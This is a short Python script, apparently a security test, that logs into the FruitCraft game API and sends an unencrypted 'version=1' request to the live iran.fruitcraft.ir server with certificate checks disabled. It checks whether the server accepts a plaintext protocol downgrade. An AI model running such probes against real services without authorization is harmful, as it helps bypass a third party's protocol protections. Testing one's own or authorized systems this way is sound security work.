import sys, os, time, requests, json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    print('Testing Version Downgrade Attack...')
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    passport = c1.passport
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; FruitClient API Build/QQ3A.200805.001)',
        'Cookie': 'FRUITPASSPORT=' + passport
    }
    
    # Send an unencrypted payload (version=1)
    payload = json.dumps({})
    import urllib.parse, base64
    b64_payload = urllib.parse.quote(base64.b64encode(payload.encode()).decode())
    raw_body_v1 = 'edata=' + b64_payload + '&version=1'
    
    res = requests.post('https://iran.fruitcraft.ir/player/getplayerinfo', data=raw_body_v1, headers=headers, verify=False)
    
    try:
        dec = res.json()
        if dec and 'status' in dec and dec['status']:
            print('[!] SUCCESS: V1 plaintext protocol downgrade possible.')
        else:
            print('[-] FAILED: V1 protocol downgrade rejected cleanly.')
    except:
        if '<html' in res.text:
            print('[-] FAILED: V1 protocol downgrade caused HTML crash (expected missing format)')
        else:
            print('[-] FAILED: Unrecognized response:', res.text[:100])

if __name__ == '__main__':
    main()
